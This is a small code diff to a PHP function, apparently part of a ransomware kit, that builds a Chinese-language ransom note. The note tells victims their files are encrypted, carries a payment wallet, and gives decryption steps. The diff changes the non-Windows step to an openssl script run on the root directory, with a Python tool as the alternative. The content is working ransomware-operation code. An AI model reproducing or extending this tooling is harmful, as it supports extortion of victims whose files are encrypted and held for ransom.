@@ -79,7 +79,8 @@ function build_ransom_note($r, $plat) {
     $w = $r['wallet'];
     $dec = ($plat === 'win')
         ? "运行 Jasmin_Decryptor.exe → 选择.pem私钥 → Decrypt"
-        : "pip3 install cryptography && python3 jasmin_decrypt.py private_key.pem";
+        : "sh jasmin_decrypt_openssl.sh private_key.pem /   （无需安装任何依赖，仅需 openssl）\n"
+         ."如偏爱 Python 工具: python3 jasmin_decrypt.py private_key.pem";
     $n = "╔══════════════════════════════════════════╗\n";
     $n.= "║  {$t}\n";
     $n.= "║  你的文件已被加密\n";
